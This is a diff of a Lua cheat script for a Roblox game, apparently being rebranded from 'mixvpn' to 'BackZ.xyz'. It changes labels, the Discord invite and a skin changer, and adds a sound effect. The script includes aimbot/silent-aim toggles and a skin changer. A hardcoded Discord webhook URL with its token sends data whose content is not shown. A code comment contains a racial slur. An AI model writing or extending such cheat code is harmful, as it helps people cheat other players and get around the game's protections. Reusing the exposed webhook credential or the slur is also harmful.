@@ -88,6 +88,19 @@ local webhookUrl = "https://discord.com/api/webhooks/1304179425264406671/Q90zkld
 local webhookData = createWebhookData()
 sendWebhook(webhookUrl, webhookData)
 
+local SoundService = game:GetService("SoundService")
+
+-- Example: Set the ambient volume
+SoundService.AmbientReverb = Enum.ReverbType.Cave
+
+-- Example: Play a sound globally
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://180315285" -- Replace with a valid sound asset ID
+sound.Volume = 0.9
+sound.Looped = false
+sound.Parent = SoundService
+sound:Play()
+
 --// Settings
 local enables = {
     main = {
@@ -671,11 +684,11 @@ end)
 
  --// Main aimbot/silentaim
  do -- Whoever got this script he's a nerd fuck that nigga
-    maintab:addToggle({text = "silent aim", risky = true, callback = function(Value)
+    maintab:addToggle({text = "not work", risky = true, callback = function(Value)
         enables.main.silent = Value
         functions:silentaim()
     end})
-    maintab:addToggle({text = "prediction", callback = function(Value)
+    maintab:addToggle({text = "not work", callback = function(Value)
         enables.main.prediction = Value
     end})
     -- maintab:addToggle({text = "predict Y", callback = function(Value)
@@ -728,8 +741,8 @@ end)
     maintab1:addToggle({text = "skin changer!", flag = "enable skins", callback = function()
 
         while library.flags['enable skins'] do task.wait(1)
-            local DV2 = game.ReplicatedStorage.ViewModels:FindFirstChild("DV2")
-            local Karambit = game.ReplicatedStorage.ViewModels:FindFirstChild("PlasmaNinjato")
+            local DV2 = game.ReplicatedStorage.ViewModels:FindFirstChild("IceDagger")
+            local Karambit = game.ReplicatedStorage.ViewModels:FindFirstChild("DV2")
             if DV2 and Karambit then
                 DV2.Name = ("DV2real")
                 Karambit.Name = ("DV2")
@@ -2128,11 +2141,11 @@ end)
          library.AnimatedText = Value
      end})
      uisettings:addDivider()
-     uisettings:addLabel({text = "Credits: mixvpn"})
-     uisettings:addLabel({text = "Everything Created by @mixvpn"})
+     uisettings:addLabel({text = "Credits mixvpn"})
+     uisettings:addLabel({text = "Everything Created by mixvpn"})
      uisettings:addLabel({text = "Supports wave Silent Aim 50/50"})
      uisettings:addLabel({text = "Best Project delta script from wave"})
-     uisettings:addLabel({text = "https://discord.gg/PWvbYBTu"})
+     uisettings:addLabel({text = "https://discord.gg/xbvDUA8eCt"})
 
 
  end
@@ -2160,16 +2173,16 @@ end)
  
  --// Game
  do
-     gameTab:addSlider({text = "fps cap:", min = 0, max = 9999, suffix = "fps", float = 1, default = 9999, flag = "fpscap_slider",callback = function(Value)
+     gameTab:addSlider({text = "fps cap:", min = 0, max = 999, suffix = "fps", float = 1, default = 999, flag = "fpscap_slider",callback = function(Value)
          setfpscap(Value)
      end})
      gameTab:addButton({text = "copy join code",callback = function(Value)
          setclipboard(("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(game.PlaceId, game.JobId))
-         library:Notify("mixvpn - succesfully copied join code!", 5)
+         library:Notify("BackZ.xyz - succesfully copied join code!", 5)
      end})
      gameTab:addButton({text = "rejoin",callback = function(Value)
          game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId)
-         library:Notify("mixvpn - succesfully rejoining server!", 5)
+         library:Notify("BackZ.xyz - succesfully rejoining server!", 5)
      end})
  end
  
